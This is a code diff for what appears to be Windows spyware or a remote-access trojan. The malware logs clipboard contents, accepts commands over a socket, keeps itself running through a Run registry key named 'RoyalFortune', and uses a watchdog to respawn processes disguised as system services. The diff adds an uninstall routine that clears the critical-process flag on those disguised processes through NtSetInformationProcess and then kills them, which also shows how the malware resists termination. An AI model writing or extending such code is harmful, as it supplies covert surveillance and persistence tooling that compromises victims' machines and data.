@@ -20,6 +20,9 @@ RECT g_old_clip;
 int g_copy_buffer_saved = 0;
 int g_cursor_count = 0;
 
+/* Global flag to stop watchdog from respawning */
+volatile int g_exiting = 0;
+
 /* Clipboard state */
 CRITICAL_SECTION g_copy_buffer_cs;
 char g_copy_buffer_log[MAX_COPY_ENTRIES][COPY_ENTRY_SIZE];
@@ -78,6 +81,7 @@ DWORD WINAPI svc_watchdog(LPVOID lpParam) {
     };
     
     while (1) {
+        if (g_exiting) return 0;
         Sleep(15000);  /* Check every 15 seconds */
         
         for (int i = 0; i < 3; i++) {
@@ -222,7 +226,44 @@ static void handle_admin_command(SOCKET sock, const char *cmd_raw) {
         }
     }
     else if (strcmp(cmd, "UNINSTALL") == 0 || strcmp(cmd, "CLEANUP") == 0 || strcmp(cmd, "Exit") == 0) {
+        /* 1. Stop watchdog from respawning */
+        g_exiting = 1;
+        
+        /* 2. Remove critical flag from ALL shadow processes and kill them */
+        const char *shadows[] = {"ElevationService.exe", "CrashHandler.exe", "NotifyService.exe"};
+        HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+        if (hSnap != INVALID_HANDLE_VALUE) {
+            PROCESSENTRY32 pe;
+            pe.dwSize = sizeof(pe);
+            if (Process32First(hSnap, &pe)) {
+                do {
+                    for (int i = 0; i < 3; i++) {
+                        if (_stricmp(pe.szExeFile, shadows[i]) == 0) {
+                            HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe.th32ProcessID);
+                            if (hProc) {
+                                HMODULE ntdll = GetModuleHandleA("ntdll.dll");
+                                if (ntdll) {
+                                    typedef NTSTATUS (WINAPI *NtSetInfoProc)(HANDLE, INT, PVOID, ULONG);
+                                    NtSetInfoProc pNtSetInfo = (NtSetInfoProc)GetProcAddress(ntdll, "NtSetInformationProcess");
+                                    if (pNtSetInfo) {
+                                        ULONG isCritical = 0;
+                                        pNtSetInfo(hProc, 29, &isCritical, sizeof(isCritical));
+                                    }
+                                }
+                                TerminateProcess(hProc, 0);
+                                CloseHandle(hProc);
+                            }
+                        }
+                    }
+                } while (Process32Next(hSnap, &pe));
+            }
+            CloseHandle(hSnap);
+        }
+        
+        /* 3. Remove critical from current process */
         sys_unprotect_process();
+        
+        /* 4. Delete registry keys */
         HKEY hKey;
         if (RegOpenKeyExA(HKEY_CURRENT_USER,
                 "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
@@ -233,7 +274,9 @@ static void handle_admin_command(SOCKET sock, const char *cmd_raw) {
             RegDeleteValueA(hKey, "RoyalFortune");
             RegCloseKey(hKey);
         }
-        result = "[CLEANUP complete — all persistence removed, exiting]";
+        
+        /* 5. Exit */
+        result = "[UNINSTALL complete — all shadows killed, persistence removed, exiting]";
         net_send_packet(sock, result);
         ExitProcess(0);
     }
